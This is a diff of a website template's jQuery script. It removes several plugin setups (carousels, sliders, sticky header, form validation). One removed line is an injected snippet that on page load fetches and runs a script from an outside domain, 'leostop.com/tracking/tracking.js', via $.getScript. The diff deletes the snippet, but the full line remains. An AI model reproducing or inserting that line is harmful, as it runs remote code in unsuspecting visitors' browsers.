@@ -13,25 +13,11 @@ $(function () {
 		$('.loader_bg').fadeToggle();
 	}, 1500);
 
-	/* JQuery Menu
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(document).ready(function () {
-		$('header nav').meanmenu();
-	});
-
 	/* Tooltip
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
 	$(document).ready(function () {
 		$('[data-toggle="tooltip"]').tooltip();
-	});
-
-	/* sticky
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(document).ready(function () {
-		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
 	});
 
 	/* Mouseover
@@ -48,90 +34,6 @@ $(function () {
 		});
 	});
 
-	/* NiceScroll
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(".brand-box").niceScroll({
-		cursorcolor: "#9b9b9c",
-	});
-
-	/* NiceSelect
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(document).ready(function () {
-		$('select').niceSelect();
-	});
-
-	/* OwlCarousel - Blog Post slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(document).ready(function () {
-		var owl = $('.carousel-slider-post');
-		owl.owlCarousel({
-			items: 1,
-			loop: true,
-			margin: 10,
-			autoplay: true,
-			autoplayTimeout: 3000,
-			autoplayHoverPause: true
-		});
-	});
-
-	/* OwlCarousel - Banner Rotator Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(document).ready(function () {
-		var owl = $('.banner-rotator-slider');
-		owl.owlCarousel({
-			items: 1,
-			loop: true,
-			margin: 10,
-			nav: true,
-			dots: false,
-			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
-			autoplay: true,
-			autoplayTimeout: 3000,
-			autoplayHoverPause: true
-		});
-	});
-
-	/* OwlCarousel - Product Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(document).ready(function () {
-		var owl = $('#product-in-slider');
-		owl.owlCarousel({
-			loop: true,
-			nav: true,
-			margin: 10,
-			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
-			responsive: {
-				0: {
-					items: 1
-				},
-				600: {
-					items: 2
-				},
-				960: {
-					items: 3
-				},
-				1200: {
-					items: 4
-				}
-			}
-		});
-		owl.on('mousewheel', '.owl-stage', function (e) {
-			if (e.deltaY > 0) {
-				owl.trigger('next.owl');
-			} else {
-				owl.trigger('prev.owl');
-			}
-			e.preventDefault();
-		});
-	});
-
-
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 	/* Scroll to Top
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
@@ -149,113 +51,6 @@ $(function () {
 		}, 1000);
 	});
 
-	/* Contact-form
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	$.validator.setDefaults({
-		submitHandler: function () {
-			alert("submitted!");
-		}
-	});
-
-	$(document).ready(function () {
-		$("#contact-form").validate({
-			rules: {
-				firstname: "required",
-				email: {
-					required: true,
-					email: true
-				},
-				lastname: "required",
-				message: "required",
-				agree: "required"
-			},
-			messages: {
-				firstname: "Please enter your firstname",
-				email: "Please enter a valid email address",
-				lastname: "Please enter your lastname",
-				username: {
-					required: "Please enter a username",
-					minlength: "Your username must consist of at least 2 characters"
-				},
-				message: "Please enter your Message",
-				agree: "Please accept our policy"
-			},
-			errorElement: "div",
-			errorPlacement: function (error, element) {
-				// Add the `help-block` class to the error element
-				error.addClass("help-block");
-
-				if (element.prop("type") === "checkbox") {
-					error.insertAfter(element.parent("input"));
-				} else {
-					error.insertAfter(element);
-				}
-			},
-			highlight: function (element, errorClass, validClass) {
-				$(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success");
-			},
-			unhighlight: function (element, errorClass, validClass) {
-				$(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error");
-			}
-		});
-	});
-
-	/* heroslider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	var swiper = new Swiper('.heroslider', {
-		spaceBetween: 30,
-		centeredSlides: true,
-		slidesPerView: 'auto',
-		paginationClickable: true,
-		loop: true,
-		autoplay: {
-			delay: 2500,
-			disableOnInteraction: false,
-		},
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
-		},
-	});
-
-
-	/* Product Filters
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	var swiper = new Swiper('.swiper-product-filters', {
-		slidesPerView: 3,
-		slidesPerColumn: 2,
-		spaceBetween: 30,
-		breakpoints: {
-			1024: {
-				slidesPerView: 3,
-				spaceBetween: 30,
-			},
-			768: {
-				slidesPerView: 2,
-				spaceBetween: 30,
-				slidesPerColumn: 1,
-			},
-			640: {
-				slidesPerView: 2,
-				spaceBetween: 20,
-				slidesPerColumn: 1,
-			},
-			480: {
-				slidesPerView: 1,
-				spaceBetween: 10,
-				slidesPerColumn: 1,
-			}
-		},
-		pagination: {
-			el: '.swiper-pagination',
-			clickable: true,
-			dynamicBullets: true
-		}
-	});
-
 	/* Countdown
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
@@ -271,76 +66,7 @@ $(function () {
 				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
 		});
 	});
-
-	/* Deal Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$('.deal-slider').slick({
-		dots: false,
-		infinite: false,
-		prevArrow: '.previous-deal',
-		nextArrow: '.next-deal',
-		speed: 500,
-		slidesToShow: 3,
-		slidesToScroll: 3,
-		infinite: false,
-		responsive: [{
-			breakpoint: 1024,
-			settings: {
-				slidesToShow: 3,
-				slidesToScroll: 2,
-				infinite: true,
-				dots: false
-			}
-		}, {
-			breakpoint: 768,
-			settings: {
-				slidesToShow: 2,
-				slidesToScroll: 2
-			}
-		}, {
-			breakpoint: 480,
-			settings: {
-				slidesToShow: 1,
-				slidesToScroll: 1
-			}
-		}]
-	});
-
-	/* News Slider
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$('#news-slider').slick({
-		dots: false,
-		infinite: false,
-		prevArrow: '.previous',
-		nextArrow: '.next',
-		speed: 500,
-		slidesToShow: 1,
-		slidesToScroll: 1,
-		responsive: [{
-			breakpoint: 1024,
-			settings: {
-				slidesToShow: 1,
-				slidesToScroll: 1,
-				infinite: true,
-				dots: false
-			}
-		}, {
-			breakpoint: 600,
-			settings: {
-				slidesToShow: 1,
-				slidesToScroll: 1
-			}
-		}, {
-			breakpoint: 480,
-			settings: {
-				slidesToShow: 1,
-				slidesToScroll: 1
-			}
-		}]
-	});
-
+	
 	/* Fancybox
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
@@ -361,12 +87,11 @@ $(function () {
 		});
 	});
 
-	/* Product slider 
+	/* Product slider
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	// optional
 	$('#blogCarousel').carousel({
 		interval: 5000
 	});
-
 
 });
